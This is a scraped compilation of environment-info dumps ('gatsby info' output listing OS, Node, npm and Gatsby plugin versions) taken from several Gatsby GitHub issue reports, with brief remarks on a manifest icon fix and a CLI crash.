``` system: os: macos mojave 10.14.6 cpu: (4) x64 intel(r) core(tm) i5-5287u cpu @ 2.90ghz shell: 5.3 - /bin/zsh binaries: node: 13.2.0 - ~/.nvm/versions/node/v13.2.0/bin/node npm: 6.13.1 - ~/.nvm/versions/node/v13.2.0/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 79.0.3945.88 firefox: 68.3.0 safari: 13.0.4 npmpackages: gatsby: 2.18.17 => 2.18.17 gatsby-plugin-google-tagmanager: 2.1.20 => 2.1.20 gatsby-plugin-manifest: 2.2.34 => 2.2.34 gatsby-plugin-netlify: 2.1.30 => 2.1.30 gatsby-plugin-netlify-cache: 1.2.0 => 1.2.0 gatsby-plugin-react-helmet: 3.1.18 => 3.1.18 gatsby-plugin-sass: 2.1.26 => 2.1.26 gatsby-plugin-sitemap: 2.2.24 => 2.2.24 gatsby-source-contentful: 2.1.73 => 2.1.73 gatsby-transformer-remark: 2.6.45 => 2.6.45 ```
``` system: os: macos 10.15.2 cpu: (8) x64 intel(r) core(tm) i7-3740qm cpu @ 2.70ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.13.1 - ~/.nvm/versions/node/v12.13.1/bin/node npm: 6.13.4 - ~/.nvm/versions/node/v12.13.1/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 79.0.3945.88 firefox: 71.0 safari: 13.0.4 npmpackages: gatsby: ^2.18.16 => 2.18.16 gatsby-image: ^2.2.37 => 2.2.37 gatsby-plugin-manifest: ^2.2.34 => 2.2.34 gatsby-plugin-mdx: ^1.0.64 => 1.0.64 gatsby-plugin-offline: ^3.0.30 => 3.0.30 gatsby-plugin-react-helmet: ^3.1.18 => 3.1.18 gatsby-plugin-sharp: ^2.3.10 => 2.3.10 gatsby-plugin-styled-components: ^3.1.16 => 3.1.16 gatsby-plugin-typescript: ^2.1.23 => 2.1.23 gatsby-remark-images: ^3.1.39 => 3.1.39 gatsby-remark-unwrap-images: ^1.0.1 => 1.0.1 gatsby-source-filesystem: ^2.1.43 => 2.1.43 gatsby-transformer-sharp: ^2.3.9 => 2.3.9 npmglobalpackages: gatsby-cli: 2.8.21
```shell system: os: macos 10.15.2 cpu: (8) x64 intel(r) core(tm) i5-8259u cpu @ 2.30ghz shell: 5.7.1 - /usr/local/bin/zsh binaries: node: 12.13.0 - ~/.nvm/versions/node/v12.13.0/bin/node yarn: 1.19.1 - /usr/local/bin/yarn npm: 6.13.0 - ~/.nvm/versions/node/v12.13.0/bin/npm languages: python: 2.7.17 - /usr/local/bin/python browsers: chrome: 79.0.3945.88 safari: 13.0.4 npmpackages: gatsby: ^2.13.2 => 2.18.15 gatsby-image: ^2.0.22 => 2.2.37 gatsby-plugin-facebook-pixel: ^1.0.3 => 1.0.3 gatsby-plugin-feed: ^2.0.8 => 2.3.25 gatsby-plugin-google-analytics: ^2.1.1 => 2.1.31 gatsby-plugin-manifest: ^2.0.5 => 2.2.33 gatsby-plugin-netlify-cache: ^1.2.0 => 1.2.0 gatsby-plugin-offline: ^2.0.5 => 2.2.10 gatsby-plugin-react-helmet: ^3.0.0 => 3.1.18 gatsby-plugin-sharp: ^2.2.1 => 2.3.9 gatsby-plugin-styled-components: ^3.1.13 => 3.1.16 gatsby-plugin-typography: ^2.2.0 => 2.3.20 gatsby-plugin-webpack-bundle-analyzer: ^1.0.5 => 1.0.5 gatsby-remark-autolink-headers: ^2.1.0 => 2.1.21 gatsby-remark-copy-linked-files: ^2.0.5 => 2.1.33 gatsby-remark-embed-video: ^1.7.0 => 1.7.1 gatsby-remark-images: ^2.0.4 => 2.0.6 gatsby-remark-prismjs: ^3.0.0 => 3.3.27 gatsby-remark-responsive-iframe: ^2.0.5 => 2.2.30 gatsby-remark-smartypants: ^2.0.5 => 2.1.19 gatsby-source-filesystem: ^2.1.1 => 2.1.42 gatsby-transformer-remark: ^2.1.6 => 2.6.44 gatsby-transformer-sharp: ^2.1.3 => 2.3.9
system: os: windows 10 10.0.18362 cpu: (8) x64 intel(r) core(tm) i7-2600 cpu @ 3.40ghz binaries: node: 12.13.1 - c:\\program files\ odejs\ ode.exe yarn: 1.19.2 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.13.1 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.16 - /c/python27/python browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.18.12 => 2.18.12 gatsby-image: ^2.2.34 => 2.2.34 gatsby-plugin-manifest: ^2.2.31 => 2.2.31 gatsby-plugin-offline: ^3.0.27 => 3.0.27 gatsby-plugin-react-helmet: ^3.1.16 => 3.1.16 gatsby-plugin-sharp: ^2.3.5 => 2.3.5 gatsby-source-filesystem: ^2.1.40 => 2.1.40 gatsby-transformer-sharp: ^2.3.7 => 2.3.7
### related issues #19267 add link check to gatsby docs
``` system: os: macos 10.15.1 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 12.11.1 - ~/.nvm/versions/node/v12.11.1/bin/node yarn: 1.19.0 - ~/.nvm/versions/node/v12.11.1/bin/yarn npm: 6.11.3 - ~/.nvm/versions/node/v12.11.1/bin/npm languages: python: 2.7.17 - /usr/local/bin/python browsers: chrome: 79.0.3945.79 firefox: 70.0.1 safari: 13.0.3
you can see the env in the reproduction for the live site: ``` system: os: macos 10.14.6 cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz shell: 3.2.57 - /bin/bash binaries: node: 11.15.0 - ~/.nvm/versions/node/v11.15.0/bin/node yarn: 1.21.1 - /usr/local/bin/yarn npm: 6.12.1 - ~/.nvm/versions/node/v11.15.0/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 79.0.3945.79 safari: 13.0.4 npmpackages: gatsby: 2.13.2 => 2.13.2 gatsby-awesome-pagination: ^0.3.4 => 0.3.4 gatsby-image: ^2.2.3 => 2.2.29 gatsby-plugin-create-client-paths: ^2.1.16 => 2.1.16 gatsby-plugin-feed: 2.3.2 => 2.3.2 gatsby-plugin-google-tagmanager: ^2.0.13 => 2.1.15 gatsby-plugin-hubspot: ^1.3.3 => 1.3.3 gatsby-plugin-lodash: ^3.0.5 => 3.1.13 gatsby-plugin-manifest: ^2.2.0 => 2.2.23 gatsby-plugin-offline: 2.2.9 => 2.2.9 gatsby-plugin-postcss: ^2.0.7 => 2.1.13 gatsby-plugin-purgecss: ^3.1.1 => 3.1.1 gatsby-plugin-react-helmet: ^3.0.12 => 3.1.13 gatsby-plugin-sass: ^2.0.11 => 2.1.20 gatsby-plugin-sharp: ^2.2.1 => 2.2.32 gatsby-source-filesystem: ^2.1.1 => 2.1.33 gatsby-source-wordpress: ^3.0.58 => 3.1.43 gatsby-transformer-sharp: ^2.2.0 => 2.2.23 npmglobalpackages: gatsby-cli: 2.8.5 ```
system: os: windows 10 10.0.18363 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz binaries: node: 12.13.1 - c:\\program files\ odejs\ ode.exe npm: 6.13.1 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.17 browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.13.31 => 2.18.12 gatsby-image: ^2.0.23 => 2.2.36 gatsby-plugin-netlify: ^2.0.6 => 2.1.30 gatsby-plugin-netlify-cms: ^4.1.6 => 4.1.33 gatsby-plugin-purgecss: ^4.0.0 => 4.0.1 gatsby-plugin-react-helmet: ^3.0.4 => 3.1.18 gatsby-plugin-sass: ^2.0.7 => 2.1.26 gatsby-plugin-sharp: ^2.2.9 => 2.3.8 gatsby-remark-copy-linked-files: ^2.0.7 => 2.1.33 gatsby-remark-images: ^3.1.6 => 3.1.38 gatsby-remark-relative-images: ^0.2.1 => 0.2.3 gatsby-source-filesystem: ^2.0.26 => 2.1.42 gatsby-transformer-remark: ^2.6.9 => 2.6.42 gatsby-transformer-sharp: ^2.1.9 => 2.3.9
``` system: os: macos 10.15.1 cpu: (4) x64 intel(r) core(tm) i5-8210y cpu @ 1.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 10.16.3 - ~/.nvm/versions/node/v10.16.3/bin/node npm: 6.13.0 - ~/.nvm/versions/node/v10.16.3/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 79.0.3945.79 safari: 13.0.3 npmpackages: gatsby: ^2.18.8 => 2.18.12 gatsby-image: ^2.2.34 => 2.2.36 gatsby-plugin-google-analytics: ^2.1.29 => 2.1.31 gatsby-plugin-manifest: ^2.2.31 => 2.2.33 gatsby-plugin-mdx: ^1.0.62 => 1.0.62 gatsby-plugin-offline: ^3.0.27 => 3.0.29 gatsby-plugin-preact: ^3.1.24 => 3.1.24 gatsby-plugin-preconnect: ^1.0.5 => 1.0.5 gatsby-plugin-react-helmet: ^3.1.16 => 3.1.18 gatsby-plugin-sass: ^2.1.26 => 2.1.26 gatsby-plugin-sharp: ^2.3.5 => 2.3.7 gatsby-remark-copy-linked-files: ^2.1.31 => 2.1.33 gatsby-remark-images: ^3.1.35 => 3.1.38 gatsby-remark-prismjs: ^3.3.25 => 3.3.27 gatsby-remark-responsive-iframe: ^2.2.28 => 2.2.30 gatsby-remark-smartypants: ^2.1.17 => 2.1.19 gatsby-source-filesystem: ^2.1.40 => 2.1.42 gatsby-transformer-remark: ^2.6.39 => 2.6.42 gatsby-transformer-sharp: ^2.3.7 => 2.3.9 npmglobalpackages: gatsby-cli: 2.8.18
system: os: macos mojave 10.14.5 cpu: (8) x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 3.2.57 - /bin/bash binaries: node: 10.16.0 - /var/folders/jn/3z685bls0mv64x4q1vjrzgy40000gn/t/yarn--1575970448966-0.5917283699676961/node yarn: 1.17.3 - /var/folders/jn/3z685bls0mv64x4q1vjrzgy40000gn/t/yarn--1575970448966-0.5917283699676961/yarn npm: 6.9.0 - ~/.nvm/versions/node/v10.16.0/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 78.0.3904.108 firefox: 70.0.1 safari: 12.1.1 npmpackages: gatsby: ^2.18.4 => 2.18.4 gatsby-image: ^2.2.34 => 2.2.34 gatsby-plugin-manifest: ^2.2.30 => 2.2.30 gatsby-plugin-mdx: ^1.0.59 => 1.0.59 gatsby-plugin-offline: ^3.0.24 => 3.0.24 gatsby-plugin-react-helmet: ^3.1.16 => 3.1.16 gatsby-plugin-sharp: ^2.3.4 => 2.3.4 gatsby-plugin-typescript: ^2.1.20 => 2.1.20 gatsby-source-filesystem: ^2.1.39 => 2.1.39 gatsby-transformer-sharp: ^2.3.6 => 2.3.6
system: os: macos 10.14.6 cpu: (16) x64 intel(r) core(tm) i9-9880h cpu @ 2.30ghz shell: 5.3 - /bin/zsh binaries: node: 8.16.0 - ~/.nvm/versions/node/v8.16.0/bin/node yarn: 1.17.0 - /usr/local/bin/yarn npm: 6.13.2 - ~/.nvm/versions/node/v8.16.0/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 78.0.3904.108 firefox: 71.0 safari: 13.0.1 npmpackages: gatsby: ^2.18.6 => 2.18.6 gatsby-cli: ^2.8.15 => 2.8.15 gatsby-image: ^2.0.37 => 2.2.34 gatsby-plugin-alias-imports: ^1.0.5 => 1.0.5 gatsby-plugin-eslint: ^2.0.4 => 2.0.8 gatsby-plugin-intl: ^0.1.7 => 0.1.7 gatsby-plugin-manifest: ^2.0.28 => 2.2.31 gatsby-plugin-offline: ^2.0.25 => 2.2.10 gatsby-plugin-react-helmet: ^3.0.12 => 3.1.16 gatsby-plugin-sharp: ^2.0.32 => 2.3.5 gatsby-plugin-sitemap: ^2.1.0 => 2.2.22 gatsby-source-filesystem: ^2.0.29 => 2.1.40 gatsby-source-graphql: ^2.1.26 => 2.1.26 gatsby-transformer-sharp: ^2.1.17 => 2.3.6 npmglobalpackages: gatsby-cli: 2.7.2
``` system: os: windows 10 10.0.17763 cpu: (4) x64 intel(r) celeron(r) n4100 cpu @ 1.10ghz binaries: node: 12.11.0 - c:\\program files\ odejs\ ode.exe yarn: 1.21.0 - ~\\appdata\ oaming\ pm\\yarn.cmd npm: 6.11.3 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.16 - /c/programs/python27/python browsers: edge: 44.17763.831.0 npmpackages: gatsby: ^2.18.4 => 2.18.7 gatsby-image: ^2.2.34 => 2.2.34 gatsby-plugin-feed: ^2.3.22 => 2.3.23 gatsby-plugin-google-analytics: ^2.1.29 => 2.1.29 gatsby-plugin-manifest: ^2.2.30 => 2.2.31 gatsby-plugin-offline: ^3.0.24 => 3.0.27 gatsby-plugin-react-helmet: ^3.1.16 => 3.1.16 gatsby-plugin-sharp: ^2.3.4 => 2.3.5 gatsby-plugin-typography: ^2.3.18 => 2.3.18 gatsby-remark-copy-linked-files: ^2.1.31 => 2.1.31 gatsby-remark-images: ^3.1.34 => 3.1.35 gatsby-remark-prismjs: ^3.3.25 => 3.3.25 gatsby-remark-responsive-iframe: ^2.2.28 => 2.2.28 gatsby-remark-smartypants: ^2.1.17 => 2.1.17 gatsby-source-filesystem: ^2.1.39 => 2.1.40 gatsby-transformer-remark: ^2.6.38 => 2.6.39 gatsby-transformer-sharp: ^2.3.6 => 2.3.7 ```
``` system: os: linux 4.4 ubuntu 18.04.3 lts (bionic beaver) cpu: (8) x64 intel(r) core(tm) i7-2600k cpu @ 3.40ghz shell: 4.4.20 - /bin/bash binaries: node: 12.13.0 - /usr/bin/node yarn: 1.19.1 - /usr/bin/yarn npm: 6.12.0 - /usr/bin/npm languages: python: 2.7.15+ - /usr/bin/python
``` system: os: windows 10 10.0.17763 cpu: (8) x64 intel(r) core(tm) i7-6700 cpu @ 3.40ghz binaries: node: 12.13.0 - ~\\appdata\\local\\temp\\yarn--1575659192406-0.508817745209361\ ode.cmd yarn: 1.19.1 - ~\\appdata\\local\\temp\\yarn--1575659192406-0.508817745209361\\yarn.cmd npm: 6.12.0 - c:\\program files\ odejs\ pm.cmd languages: python: 3.7.2 - /c/users/r2dfoo/appdata/local/programs/python/python37/python browsers: edge: 44.17763.831.0
system: os: macos mojave 10.14.6 cpu: (12) x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 5.7.1 - /usr/local/bin/zsh binaries: node: 12.13.0 - /var/folders/4c/08vnt0sx6zg3djdt5ln5rjk00000gp/t/yarn--1575565990280-0.563851784977069/node yarn: 1.19.1 - /var/folders/4c/08vnt0sx6zg3djdt5ln5rjk00000gp/t/yarn--1575565990280-0.563851784977069/yarn npm: 6.12.0 - ~/.nvm/versions/node/v12.13.0/bin/npm languages: python: 2.7.16 - /users/jquense/.pyenv/shims/python browsers: chrome: 78.0.3904.108 firefox: 69.0.1 safari: 13.0.3
``` system: os: linux 4.4 ubuntu 18.04.3 lts (bionic beaver) cpu: (8) x64 intel(r) xeon(r) cpu e3-1230 v3 @ 3.30ghz shell: 4.4.20 - /bin/bash binaries: node: 12.13.0 - ~/.nvm/versions/node/v12.13.0/bin/node yarn: 1.19.2 - /usr/bin/yarn npm: 6.12.0 - ~/.nvm/versions/node/v12.13.0/bin/npm npmpackages: gatsby: ^2.18.5 => 2.18.6 npmglobalpackages: gatsby-cli: 2.8.11 gatsby-dev-cli: 2.5.38
system: os: macos 10.15 cpu: (4) x64 intel(r) core(tm) i5-5257u cpu @ 2.70ghz shell: 3.2.57 - /bin/bash binaries: node: 10.15.3 - /usr/local/bin/node yarn: 1.15.2 - /usr/local/bin/yarn npm: 6.13.1 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/local/bin/python browsers: chrome: 78.0.3904.108 safari: 13.0.2 npmpackages: gatsby: 2.18.6 => 2.18.6 gatsby-source-filesystem: ^2.1.40 => 2.1.40 npmglobalpackages: gatsby-cli: 2.7.28
system: os: windows 7 cpu: (8) x64 intel(r) core(tm) i7-6820hq cpu @ 2.70ghz binaries: yarn: 1.17.3 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.10.0 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.15 @wardpeet
``` system: os: macos 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-4850hq cpu @ 2.30ghz shell: 3.2.57 - /bin/bash binaries: node: 12.11.1 - /var/folders/hp/53td47vs5bq5pcx9j918qsfc0000gn/t/yarn--1575197307021-0.11396977243068873/node yarn: 1.19.2 - /var/folders/hp/53td47vs5bq5pcx9j918qsfc0000gn/t/yarn--1575197307021-0.11396977243068873/yarn npm: 6.13.1 - /usr/local/bin/npm languages: python: 3.7.3 - /users/owen/.pyenv/shims/python browsers: chrome: 78.0.3904.108 firefox: 70.0.1 safari: 13.0.3 npmpackages: gatsby: 2.15.36 => 2.15.36 gatsby-image: 2.2.27 => 2.2.27 gatsby-plugin-manifest: 2.2.21 => 2.2.21 gatsby-plugin-offline: 3.0.14 => 3.0.14 gatsby-plugin-react-helmet: 3.1.11 => 3.1.11 gatsby-plugin-sharp: 2.2.29 => 2.2.29 gatsby-plugin-styled-components: 3.1.9 => 3.1.9 gatsby-plugin-typography: 2.3.12 => 2.3.12 gatsby-source-filesystem: 2.1.31 => 2.1.31 gatsby-transformer-remark: 2.6.32 => 2.6.32 gatsby-transformer-sharp: 2.2.21 => 2.2.21
``` ## proposed fix adding the 32x32px version to the [default icons config]( #l5) fixes this, and looks good in other browsers i tested too (chrome, safari, ios safari)
happy to submit a pr with this change, unless there's a known reason to avoid including the 32x32 resolution.
system: os: windows 8.1 6.3.9600 cpu: (4) x64 intel(r) core(tm) i5-4460s cpu @ 2.90ghz binaries: node: 12.13.1 - c:\\program files\ odejs\ ode.exe npm: 6.12.1 - c:\\program files\ odejs\ pm.cmd languages: python: 3.8.0 npmpackages: gatsby: ^2.18.5 => 2.18.5 gatsby-image: ^2.2.34 => 2.2.34 gatsby-plugin-netlify: ^2.1.27 => 2.1.27 gatsby-plugin-netlify-cms: ^4.1.30 => 4.1.30 gatsby-plugin-purgecss: ^4.0.0 => 4.0.1 gatsby-plugin-react-helmet: ^3.1.16 => 3.1.16 gatsby-plugin-sass: ^2.1.24 => 2.1.24 gatsby-plugin-sharp: ^2.3.4 => 2.3.4 gatsby-remark-copy-linked-files: ^2.1.31 => 2.1.31 gatsby-remark-images: ^3.1.34 => 3.1.34 gatsby-remark-relative-images: ^0.2.1 => 0.2.3 gatsby-source-filesystem: ^2.1.39 => 2.1.39 gatsby-transformer-remark: ^2.6.38 => 2.6.38 gatsby-transformer-sharp: ^2.3.6 => 2.3.6
system: os: macos 10.15.1 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 3.2.57 - /bin/bash binaries: node: 12.10.0 - /usr/local/bin/node yarn: 1.19.0 - /usr/local/bin/yarn npm: 6.12.0 - /usr/local/bin/npm languages: python: 2.7.16 - /users/kyemaloy/.pyenv/shims/python browsers: chrome: 78.0.3904.108 firefox: 70.0 safari: 13.0.3 npmpackages: gatsby: ^2.9.6 => 2.9.6 gatsby-plugin-google-analytics: ^2.1.0 => 2.1.0 gatsby-plugin-manifest: ^2.2.0 => 2.2.0 gatsby-plugin-mdx: ^1.0.58 => 1.0.58 gatsby-plugin-react-helmet: ^3.0.12 => 3.0.12 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sharp: ^2.2.31 => 2.2.31 gatsby-remark-autolink-headers: ^2.1.10 => 2.1.10 gatsby-remark-images: ^3.1.28 => 3.1.28 gatsby-source-filesystem: ^2.1.0 => 2.1.0 gatsby-transformer-yaml: ^2.2.4 => 2.2.4 npmglobalpackages: gatsby-cli: 2.7.47
unfortunately, i can't run `gatsby info --clipboard`, since it crashes with the same `statestoreprovider` error as the other commands
i reverted my gatsby version again and ran this command
**note that the gatsby version in the output below is incorrect**
``` system: os: windows 10 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz binaries: npm: 6.9.0 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.16 - c:\\python27\\python.exe browsers: edge: 44.18362.267.0 npmpackages: gatsby: ^2.17.7 => 2.17.7 gatsby-source-apiserver: ^2.1.4 => 2.1.4
system: os: macos mojave 10.14.6 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 10.12.0 - /usr/local/bin/node yarn: 1.10.1 - /usr/local/bin/yarn npm: 6.13.1 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 78.0.3904.108 firefox: 70.0.1 safari: 13.0.2 npmpackages: gatsby: ^2.15.29 => 2.18.1 gatsby-cli: ^2.7.54 => 2.8.13 gatsby-image: ^2.2.5 => 2.2.33 gatsby-plugin-create-client-paths: ^2.1.15 => 2.1.17 gatsby-plugin-layout: ^1.1.5 => 1.1.15 gatsby-plugin-manifest: ^2.2.2 => 2.2.29 gatsby-plugin-mdx: ^1.0.57 => 1.0.57 gatsby-plugin-offline: ^2.2.2 => 2.2.10 gatsby-plugin-react-helmet: ^3.1.1 => 3.1.15 gatsby-plugin-sharp: ^2.3.2 => 2.3.2 gatsby-plugin-stripe: ^1.2.3 => 1.2.3 gatsby-plugin-styled-components: ^3.1.12 => 3.1.13 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-remark-audio: ^1.0.2 => 1.0.2 gatsby-remark-images: ^3.1.33 => 3.1.33 gatsby-source-filesystem: ^2.1.4 => 2.1.38 gatsby-transformer-remark: ^2.6.38 => 2.6.38 gatsby-transformer-sharp: ^2.2.2 => 2.3.5 gatsby-transformer-yaml: ^2.2.12 => 2.2.17 npmglobalpackages: gatsby-cli: 2.8.14
system: os: windows 10 10.0.18363 cpu: (4) x64 intel(r) core(tm) i5-7200u cpu @ 2.50ghz binaries: node: 12.13.1 - c:\\program files\ odejs\ ode.exe yarn: 1.19.2 - c:\\users\\ericcote\\appdata\ oaming\ pm\\yarn.cmd npm: 6.13.1 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.17 browsers: edge: 44.18362.449.0 npmpackages: gatsby: 2.17.17 => 2.17.17 gatsby-image: ^2.2.27 => 2.2.34 gatsby-plugin-gtag: ^1.0.11 => 1.0.11 gatsby-plugin-hubspot: ^1.3.3 => 1.3.3 gatsby-plugin-manifest: ^2.2.17 => 2.2.30 gatsby-plugin-offline: ^3.0.14 => 3.0.24 gatsby-plugin-react-helmet: ^3.1.7 => 3.1.16 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sass: ^2.1.14 => 2.1.24 gatsby-plugin-sharp: ^2.2.24 => 2.3.4 gatsby-source-filesystem: ^2.1.24 => 2.1.39 gatsby-transformer-json: ^2.2.9 => 2.2.20 gatsby-transformer-remark: ^2.6.35 => 2.6.38 gatsby-transformer-sharp: ^2.2.15 => 2.3.6
system: os: macos mojave 10.14.6 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 10.12.0 - /usr/local/bin/node yarn: 1.10.1 - /usr/local/bin/yarn npm: 6.13.1 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 78.0.3904.108 firefox: 70.0.1 safari: 13.0.2 npmpackages: gatsby: ^2.13.50 => 2.18.1 gatsby-image: ^2.2.8 => 2.2.33 gatsby-plugin-layout: ^1.1.15 => 1.1.15 gatsby-plugin-manifest: ^2.2.4 => 2.2.29 gatsby-plugin-mdx: ^1.0.0 => 1.0.57 gatsby-plugin-offline: ^2.2.4 => 2.2.10 gatsby-plugin-react-helmet: ^3.1.3 => 3.1.15 gatsby-plugin-sharp: ^2.3.3 => 2.3.3 gatsby-plugin-styled-components: 3.1.13 => 3.1.13 gatsby-remark-images: ^3.1.33 => 3.1.33 gatsby-source-filesystem: ^2.1.8 => 2.1.38 gatsby-transformer-sharp: ^2.2.5 => 2.3.5 npmglobalpackages: gatsby-cli: 2.8.13
- gatsby-transformer-remark: 2.6.37
- toml: 3.0.0
system: os: macos 10.15.1 cpu: (4) x64 intel(r) core(tm) i5-4670 cpu @ 3.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.4.0 - ~/.nvm/versions/node/v12.4.0/bin/node yarn: 1.17.0 - /usr/local/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v12.4.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 78.0.3904.108 firefox: 70.0 safari: 13.0.3 npmpackages: gatsby: ^2.18.0 => 2.18.0 gatsby-background-image: ^0.9.6 => 0.9.6 gatsby-image: ^2.2.30 => 2.2.33 gatsby-plugin-google-analytics: ^2.1.23 => 2.1.28 gatsby-plugin-google-tagmanager: ^2.1.15 => 2.1.17 gatsby-plugin-gtag: ^1.0.11 => 1.0.11 gatsby-plugin-hotjar-tracking: ^1.0.0 => 1.0.0 gatsby-plugin-html-attributes: ^1.0.5 => 1.0.5 gatsby-plugin-manifest: ^2.2.29 => 2.2.29 gatsby-plugin-react-helmet: ^3.1.13 => 3.1.15 gatsby-plugin-react-svg: ^2.1.2 => 2.1.2 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sharp: ^2.3.2 => 2.3.2 gatsby-plugin-sitemap: ^2.2.19 => 2.2.21 gatsby-source-contentful: ^2.1.62 => 2.1.62 gatsby-source-filesystem: ^2.1.38 => 2.1.38 gatsby-transformer-remark: ^2.6.32 => 2.6.37 gatsby-transformer-sharp: ^2.3.2 => 2.3.5 npmglobalpackages: gatsby-cli: 2.8.8
system: os: macos mojave 10.14.6 cpu: (4) x64 intel(r) core(tm) i5-6267u cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 10.15.1 - /var/folders/pp/s13nkxgs3p55k2tysv_tbpt40000gn/t/yarn--1574329843466-0.9005054828235552/node yarn: 1.19.1 - /var/folders/pp/s13nkxgs3p55k2tysv_tbpt40000gn/t/yarn--1574329843466-0.9005054828235552/yarn npm: 6.4.1 - /usr/local/bin/npm languages: python: 2.7.13 - /usr/local/bin/python browsers: chrome: 78.0.3904.108 firefox: 63.0.3 safari: 13.0.3
system: os: macos high sierra 10.13.6 cpu: (4) x64 intel(r) core(tm) i5-5257u cpu @ 2.70ghz shell: 5.3 - /bin/zsh binaries: node: 10.17.0 - ~/.nvm/versions/node/v10.17.0/bin/node yarn: 1.10.1 - /usr/local/bin/yarn npm: 6.11.3 - ~/.nvm/versions/node/v10.17.0/bin/npm languages: python: 2.7.10 - /users/yishan/.pyenv/shims/python browsers: chrome: 78.0.3904.97 firefox: 70.0.1 safari: 12.0 npmpackages: gatsby: ^2.17.11 => 2.17.11 gatsby-remark-prismjs: ^3.3.24 => 3.3.24 gatsby-source-filesystem: ^2.1.38 => 2.1.38 gatsby-transformer-remark: ^2.6.37 => 2.6.37
system: os: windows 10 cpu: (8) x64 intel(r) core(tm) i5-8250u cpu @ 1.60ghz binaries: node: 10.15.0 - c:\\program files\ odejs\ ode.exe yarn: 1.17.3 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.9.0-next.0 - c:\\program files\ odejs\ pm.cmd languages: python: 3.6.5 - /c/users/hugens/appdata/local/programs/python/python36-32/python browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.17.6 => 2.17.15 gatsby-background-image: ^0.8.18 => 0.8.19 gatsby-image: ^2.2.30 => 2.2.33 gatsby-plugin-manifest: ^2.2.25 => 2.2.28 gatsby-plugin-netlify-cms: ^4.1.26 => 4.1.28 gatsby-plugin-offline: ^3.0.17 => 3.0.21 gatsby-plugin-react-helmet: ^3.1.13 => 3.1.15 gatsby-plugin-sharp: ^2.2.34 => 2.3.0 gatsby-remark-copy-linked-files: ^2.1.28 => 2.1.30 gatsby-remark-images: ^3.1.29 => 3.1.31 gatsby-remark-relative-images: ^0.2.3 => 0.2.3 gatsby-source-filesystem: ^2.1.35 => 2.1.37 gatsby-transformer-remark: ^2.6.32 => 2.6.35 gatsby-transformer-sharp: ^2.3.1 => 2.3.5
```sh system: os: macos 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 5.3 - /bin/zsh binaries: node: 12.13.0 - ~/.nvm/versions/node/v12.13.0/bin/node npm: 6.12.0 - ~/.nvm/versions/node/v12.13.0/bin/npm languages: python: 2.7.17 - /usr/local/bin/python browsers: chrome: 78.0.3904.97 firefox: 70.0 safari: 13.0.3
``` system: os: linux 4.9 debian gnu/linux 9 (stretch) 9 (stretch) cpu: (8) x64 intel(r) core(tm) i7-7700k cpu @ 4.20ghz shell: 5.3.1 - /bin/zsh binaries: node: 10.15.3 - ~/.nvm/versions/node/v10.15.3/bin/node npm: 6.12.0 - ~/.nvm/versions/node/v10.15.3/bin/npm languages: python: 3.6.4 - /opt/anaconda3/bin/python browsers: chrome: 77.0.3865.90 firefox: 68.2.0esr npmpackages: gatsby: ^2.17.15 => 2.17.15 gatsby-image: ^2.2.33 => 2.2.33 gatsby-plugin-manifest: ^2.2.28 => 2.2.28 gatsby-plugin-offline: ^2.2.10 => 2.2.10 gatsby-plugin-react-helmet: ^3.1.15 => 3.1.15 gatsby-plugin-sass: ^2.1.23 => 2.1.23 gatsby-plugin-sharp: ^2.3.0 => 2.3.0 gatsby-source-filesystem: ^2.1.37 => 2.1.37 gatsby-transformer-sharp: ^2.3.5 => 2.3.5 npmglobalpackages: gatsby-cli: 2.8.11
``` system: os: linux 5.3 nixos 19.09.976.c75de8bc12c (loris) 19.09.976.c75de8bc12c (loris) cpu: (4) x64 intel(r) core(tm) i5-2540m cpu @ 2.60ghz shell: 4.4.23 - binaries: node: 10.16.0 - yarn: 1.17.3 - npm: 6.9.0 - languages: python: 3.7.5 - browsers: firefox: 70.0b2
